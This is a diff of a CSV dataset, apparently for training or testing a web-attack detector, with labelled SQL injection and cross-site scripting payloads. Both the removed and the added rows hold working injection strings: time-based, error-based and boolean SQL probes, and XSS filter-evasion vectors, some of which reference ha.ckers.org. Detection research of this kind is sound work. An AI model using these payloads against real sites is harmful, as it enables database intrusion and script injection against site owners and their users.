@@ -1,18 +1,26 @@
-payload,length,attack_type,label
-"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('crkz'='crkz",116,sqli,anom
-"-1270'||(select 'mgdi' where 6785=6785 union all select 6785,6785#",66,sqli,anom
-1')));select pg_sleep(5)--,26,sqli,anom
-"1 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)-- pvdw",82,sqli,anom
-"1'+(select 'qzcx' where 9524=9524 and elt(3069=8430,8430))+'",60,sqli,anom
-"1') as mwpp where 6192=6192;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",144,sqli,anom
-"<style>li {list-style-image: url(""javascript:alert('xss')"");}</style><ul><li>xss",80,xss,anom
-"</textarea>'""><script>alert(xss)</script>",41,xss,anom
-"'""""><script language=""javascript""> alert('x s s');</script>",59,xss,anom
-</script></script><<<<script><>>>><<<script>alert(xss)</script>,63,xss,anom
-<html><noalert><noscript>(xss)</noscript><script>(xss)</script>,63,xss,anom
-'></select><script>alert(xss)</script>,38,xss,anom
-nasir,34,norm,norm
-234,34,norm,norm
-rasel,34,norm,norm
-900,34,norm,norm
-killer,34,norm,norm
+payload,attack_type,label
+1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),sqli,anom
+"1""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""abcw""=""abcw",sqli,anom
+"1%'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('%'='",sqli,anom
+1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('njge' like 'njge,sqli,anom
+"1') where 7007=7007 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,anom
+"1""))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""gfwz""=""gfwz",sqli,anom
+"1)) as pjjz where 8384=8384 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",sqli,anom
+"1%"")) order by 1#",sqli,anom
+1));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,anom
+"<meta http-equiv=""link"" content=""<http://ha.ckers.org/xss.css>; rel=stylesheet"">",xss,anom
+"<style>body{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</style>",xss,anom
+"<img id=xss src=""mocha:[code]"">",xss,anom
+"<img id=xss src=""livescript:[code]"">",xss,anom
+"<meta http-equiv=""link"" content=""<javascript:alert('xss')>; rel=stylesheet"">",xss,anom
+"<meta http-equiv=""refresh"" content=""0; url=http://;url=javascript:alert('xss');"">",xss,anom
+"<div style=""background-image: url(javascript:alert('xss'))"">",xss,anom
+"<div style=""width: expression(alert('xss'));"">",xss,anom
+"<img style=""xss:expr/*xss*/ession(alert('xss'))"">",xss,anom
+"<xss style=""xss:expression(alert('xss'))"">",xss,anom
+"exp/*<xss style='no\\xss:noxss(""*//*"");",xss,anom
+"<object type=""text/x-scriptlet"" data=""http://ha.ckers.org/scriptlet.html""></object>",xss,anom
+"geturl(""javascript:alert('xss')"")",xss,anom
+"a=""get"";",xss,anom
+"<!--<value><![cdata[<xml id=i><x><c><![cdata[<img id=xss src=""javas<![cdata[cript:alert('xss');"">",xss,anom
+"<xml id=xss src=""http://ha.ckers.org/xsstest.xml"" id=i></xml>",xss,anom
